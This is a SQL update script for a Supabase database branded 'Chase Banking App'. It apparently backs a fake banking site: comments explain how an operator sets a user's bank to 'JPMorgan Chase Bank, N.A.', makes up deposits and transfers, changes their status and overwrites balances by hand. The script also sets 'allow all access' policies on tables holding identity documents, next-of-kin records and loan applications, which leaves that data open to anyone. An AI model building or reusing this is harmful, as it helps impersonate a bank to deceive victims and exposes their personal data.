
-- ============================================
-- CHASE BANKING APP - DATABASE UPDATE
-- Run this SQL in your Supabase SQL Editor
-- ============================================

-- =====================
-- 1. DROP UNUSED TABLES
-- =====================
DROP TABLE IF EXISTS cashapp_deposits CASCADE;
DROP TABLE IF EXISTS gift_card_deposits CASCADE;
DROP TABLE IF EXISTS crypto_deposits CASCADE;
DROP TABLE IF EXISTS site_settings CASCADE;

-- =====================
-- 2. ADD NEW COLUMNS TO USERS TABLE
-- =====================
ALTER TABLE users ADD COLUMN IF NOT EXISTS bank_name TEXT;
ALTER TABLE users ADD COLUMN IF NOT EXISTS cashapp_tag TEXT;
ALTER TABLE users ADD COLUMN IF NOT EXISTS welcome_message TEXT;

-- =====================
-- 3. ENSURE TRANSACTIONS TABLE HAS STATUS COLUMN
-- =====================
-- (It should already exist, but just in case)
ALTER TABLE transactions ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'Pending';

-- =====================
-- 4. RLS POLICIES (allow all access)
-- =====================

-- USERS
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all access to users" ON users;
CREATE POLICY "Allow all access to users" ON users FOR ALL USING (true) WITH CHECK (true);

-- TRANSACTIONS
ALTER TABLE transactions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all access to transactions" ON transactions;
CREATE POLICY "Allow all access to transactions" ON transactions FOR ALL USING (true) WITH CHECK (true);

-- NOTIFICATIONS
ALTER TABLE notifications ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all access to notifications" ON notifications;
CREATE POLICY "Allow all access to notifications" ON notifications FOR ALL USING (true) WITH CHECK (true);

-- DOCUMENTS
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all access to documents" ON documents;
CREATE POLICY "Allow all access to documents" ON documents FOR ALL USING (true) WITH CHECK (true);

-- NEXT_OF_KIN
ALTER TABLE next_of_kin ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all access to next_of_kin" ON next_of_kin;
CREATE POLICY "Allow all access to next_of_kin" ON next_of_kin FOR ALL USING (true) WITH CHECK (true);

-- NOK_DOCUMENTS
ALTER TABLE nok_documents ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all access to nok_documents" ON nok_documents;
CREATE POLICY "Allow all access to nok_documents" ON nok_documents FOR ALL USING (true) WITH CHECK (true);

-- LOAN_APPLICATIONS
ALTER TABLE loan_applications ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all access to loan_applications" ON loan_applications;
CREATE POLICY "Allow all access to loan_applications" ON loan_applications FOR ALL USING (true) WITH CHECK (true);

-- =====================
-- 5. ENABLE REALTIME
-- =====================
ALTER PUBLICATION supabase_realtime ADD TABLE transactions;
ALTER PUBLICATION supabase_realtime ADD TABLE users;
ALTER PUBLICATION supabase_realtime ADD TABLE notifications;

-- ============================================
-- HOW TO USE FROM SUPABASE DASHBOARD:
-- ============================================
--
-- SET USER'S BANK NAME:
--   UPDATE users SET bank_name = 'JPMorgan Chase Bank, N.A.' WHERE id = 'user-uuid';
--
-- SET USER'S CASH APP TAG:
--   UPDATE users SET cashapp_tag = '$UserTag' WHERE id = 'user-uuid';
--
-- SET USER'S WELCOME MESSAGE:
--   UPDATE users SET welcome_message = 'Welcome! Your account is ready.' WHERE id = 'user-uuid';
--
-- ADD A DEPOSIT TRANSACTION (shows in Recent Transactions):
--   INSERT INTO transactions (user_id, type, amount, description, status)
--   VALUES ('user-uuid', 'Deposit', 500.00, '$500.00 was deposited', 'Pending');
--
-- ADD A TRANSFER TRANSACTION:
--   INSERT INTO transactions (user_id, type, amount, description, status)
--   VALUES ('user-uuid', 'Transfer', 200.00, '$200.00 was transferred', 'Pending');
--
-- CHANGE TRANSACTION STATUS:
--   UPDATE transactions SET status = 'Completed' WHERE id = 'transaction-uuid';
--   UPDATE transactions SET status = 'Canceled' WHERE id = 'transaction-uuid';
--
-- ADJUST USER BALANCE:
--   UPDATE users SET balance = 5000.00 WHERE id = 'user-uuid';
--
-- ADD A NOTIFICATION/NEWS:
--   INSERT INTO notifications (user_id, message)
--   VALUES ('user-uuid', 'Your deposit has been approved!');
